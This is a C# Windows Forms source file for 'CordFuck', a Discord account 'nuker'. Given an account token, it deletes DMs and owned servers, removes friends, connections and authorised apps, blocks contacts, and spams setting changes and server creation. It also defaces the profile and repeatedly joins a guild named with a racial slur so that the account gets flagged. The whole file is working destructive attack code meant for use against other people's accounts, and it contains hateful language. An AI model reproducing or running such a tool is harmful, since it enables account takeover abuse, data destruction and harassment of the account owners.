using Discord;
using Leaf.xNet;
using System;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace CordFuck
{
    public partial class CordFuck : Form
    {

        private DiscordClient client;
        private bool nuking;
        private Random rand;

        public CordFuck()
        {
            InitializeComponent();

            rand = new Random();
            nuking = false;
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label3_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            try
            {
                new Thread(NukeAccount).Start();
                notifyIcon1.ShowBalloonTip(1000);
            }
            catch
            {

            }
        }

        private void NukeAccount()
        {
            try
            {
                nuking = true;
                if (client == null) client = new DiscordClient(guna2TextBox20.Text);

                if (guna2CustomCheckBox1.Checked) new Thread(ClearDMs).Start();
                if (guna2CustomCheckBox2.Checked) new Thread(ClearRelationships).Start();
                if (guna2CustomCheckBox3.Checked) new Thread(BlockEveryone).Start();
                if (guna2CustomCheckBox4.Checked) new Thread(ChangeSettings).Start();
                if (guna2CustomCheckBox5.Checked) new Thread(RemoveAvatar).Start();
                if (guna2CustomCheckBox6.Checked) new Thread(RemoveAuthorizedApps).Start();
                if (guna2CustomCheckBox7.Checked) new Thread(SpamServers).Start();
                if (guna2CustomCheckBox8.Checked) new Thread(RemoveConnections).Start();
                if (guna2CustomCheckBox9.Checked) new Thread(SpamTheme).Start();
                if (guna2CustomCheckBox10.Checked) new Thread(SpamLanguage).Start();
                if (guna2CustomCheckBox11.Checked) new Thread(RemoveHypeSquad).Start();
                if (guna2CustomCheckBox13.Checked) new Thread(UnverifyEmail).Start();
                if (guna2CustomCheckBox14.Checked) new Thread(LockAccount).Start();
                if (guna2CustomCheckBox15.Checked) new Thread(FlagAccount).Start();
                if (guna2CustomCheckBox16.Checked) new Thread(LeaveGuilds).Start();
                if (guna2CustomCheckBox17.Checked) new Thread(DeleteGuilds).Start();
            }
            catch
            {

            }
        }

        private void UnverifyEmail()
        {
            try
            {
                HttpRequest request = new HttpRequest();
                request.AddHeader("Authorization", client.Token);
                request.Get("https://discord.com/api/v6/guilds/0/members");
            }
            catch
            {

            }
        }

        private void FlagAccount()
        {
            try
            {
                while (true)
                {
                    try
                    {
                        client.JoinGuild("++++ black nigger balls ++++");
                    }
                    catch (RateLimitException)
                    {
                        break;
                    }
                }
            }
            catch
            {

            }
        }

        private void RemoveHypeSquad()
        {
            try
            {
                client.User.SetHypesquad(Hypesquad.None);
            }
            catch
            {

            }
        }

        private void SpamServers()
        {
            try
            {
                var guilds = client.GetGuilds();
                for (int i = 0; i < 100 - guilds.Count; i++)
                {
                    client.CreateGuildAsync("Fucked by CordFuck / @9xc on GitHub");
                }
            }
            catch
            {

            }
        }

        private void RemoveConnections()
        {
            try
            {
                foreach (ConnectedAccount account in client.GetConnectedAccounts())
                {
                    client.RemoveConnectedAccountAsync(account.Type, account.Id);
                }
            }
            catch
            {

            }
        }

        private void RemoveAuthorizedApps()
        {
            try
            {
                foreach (AuthorizedApp app in client.GetAuthorizedApps())
                {
                    app.DeauthorizeAsync();
                }
            }
            catch
            {

            }
        }

        private void ClearDMs()
        {
            try
            {
                foreach (PrivateChannel channel in client.GetPrivateChannels())
                {
                    channel.DeleteAsync();
                }
            }
            catch
            {

            }
        }

        private void ClearRelationships()
        {
            try
            {
                foreach (DiscordRelationship relationship in client.GetRelationships())
                {
                    relationship.RemoveAsync();
                }
            }
            catch
            {

            }
        }

        private void BlockEveryone()
        {
            try
            {
                foreach (DiscordRelationship relationship in client.GetRelationships())
                {
                    relationship.User.BlockAsync();
                }

                foreach (PrivateChannel channel in client.GetPrivateChannels())
                {
                    foreach (DiscordUser recipient in channel.Recipients)
                    {
                        recipient.BlockAsync();
                    }
                }
            }
            catch
            {

            }
        }

        private void LeaveGuilds()
        {
            try
            {
                foreach (PartialGuild guild in client.GetGuilds())
                {
                    if (!guild.Owner) guild.LeaveAsync();
                }
            }
            catch
            {

            }
        }

        private void DeleteGuilds()
        {
            try
            {
                foreach (PartialGuild guild in client.GetGuilds())
                {
                    if (guild.Owner) guild.DeleteAsync();
                }
            }
            catch
            {

            }
        }

        private void RemoveAvatar()
        {
            try
            {
                client.User.ChangeProfileAsync(new UserProfileUpdate()
                {
                    Avatar = null,
                });
            }
            catch
            {

            }
        }

        private void SpamTheme()
        {
            try
            {
                while (nuking)
                {
                    Thread.Sleep(5);

                    client.User.ChangeSettings(new UserSettingsProperties()
                    {
                        Theme = DiscordTheme.Dark,
                    });
                    client.User.ChangeSettings(new UserSettingsProperties()
                    {
                        Theme = DiscordTheme.Light,
                    });
                }
            }
            catch
            {

            }
        }


        private void SpamLanguage()
        {
            try
            {
                var settings = client.User.GetSettings();
                DiscordLanguage[] languages = new DiscordLanguage[10] { DiscordLanguage.Greek, DiscordLanguage.Lithuanian, DiscordLanguage.Chinese, DiscordLanguage.Bulgarian, DiscordLanguage.Korean, DiscordLanguage.Thai, DiscordLanguage.Russian, DiscordLanguage.Ukranian, DiscordLanguage.Viatnamese, DiscordLanguage.Hindi };
                while (nuking)
                {
                    Thread.Sleep(50);

                    client.User.ChangeSettings(new UserSettingsProperties()
                    {
                        Theme = settings.Theme,
                        Language = languages[rand.Next(0, languages.Count())],
                    });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void LockAccount()
        {
            try
            {
                HttpRequest request = new HttpRequest();
                request.AddHeader("Authorization", client.Token);
                request.AddHeader("Content-Type", "application/json");
                request.Patch("https://discord.com/api/v9/users/@me", "{\"bio\":\"Fucked by CordFuck / @9xc on GitHub\"}", "application/json");
            }
            catch
            {

            }
        }

        private void ChangeSettings()
        {
            try
            {
                client.User.ChangeSettingsAsync(new UserSettingsProperties()
                {
                    DeveloperMode = false,
                    ExplicitContentFilter = ExplicitContentFilter.DoNotScan,
                    RestrictGuildsByDefault = true,
                    CompactMessages = true,
                    PlayAnimatedEmojis = false,
                    StickerAnimation = StickerAnimationAvailability.Never,
                    ConvertEmoticons = true,
                    CustomStatus = new CustomStatus() { EmojiName = "‼️", Text = "Fucked by CordFuck / @9xc on GitHub" },
                    Theme = DiscordTheme.Light,
                    Language = DiscordLanguage.Hindi,
                    PlayGifsAutomatically = false,
                    EnableTts = false,
                    ViewNsfwGuilds = false,
                });
            }
            catch (DiscordHttpException ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            nuking = false;
        }

        private void CordFuck_Load(object sender, EventArgs e)
        {

        }

        private void guna2Button4_Click_1(object sender, EventArgs e)
        {
            nuking = false;
        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {
            try
            {
                new Thread(NukeAccount).Start();
                notifyIcon1.ShowBalloonTip(1000);
            }
            catch
            {

            }
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Soon...");
        }
    }
}
